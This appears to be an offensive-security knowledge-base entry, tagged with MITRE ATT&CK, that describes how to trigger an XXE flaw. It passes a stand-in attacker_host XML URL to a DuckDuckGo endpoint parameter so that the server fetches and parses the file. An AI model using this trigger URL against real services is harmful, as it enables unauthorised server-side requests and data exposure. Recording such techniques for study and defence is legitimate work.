---
tags:
  - xxe
  - web
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 991163bc-be11-4d44-97a2-17b347a9284f
created_at: '2025-12-13T09:00:33.814Z'
updated_at: '2025-12-13T09:00:33.814Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Access DuckDuckGo Endpoint with Malicious URL

## Summary

This procedure triggers the XXE vulnerability by accessing the DuckDuckGo endpoint with a URL pointing to the malicious XML file, causing the server to fetch and parse it.

## Description

By passing the malicious XML URL as a parameter, the endpoint processes it, leading to entity expansion and requests to attacker resources. This bypasses previous fixes using blind techniques.

## Requirements

1. Malicious XML hosted
2. Web browser or HTTP client
3. Access to DuckDuckGo endpoint

## Defense

Defensive measures and detection strategies:

- Validate and sanitize URL parameters
- Log and alert on suspicious XML parsing

## Objectives

1. Trigger XML fetching
2. Cause entity expansion
3. Enable blind injection

## Instructions

### Step 1: Construct the URL

**Context**: Build the endpoint URL with the malicious parameter.

Use: https://duckduckgo.com/x.js?u=http://attacker_host/xxe.xml

> This passes the XML URL to the 'u' parameter.

### Step 2: Access the Endpoint

**Context**: Send the request to DuckDuckGo.

Navigate to or request the constructed URL.

> The server will fetch and parse the XML.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques



## Commands Used



## Tools Used



## Tags

- [[xxe]]
- [[web]]
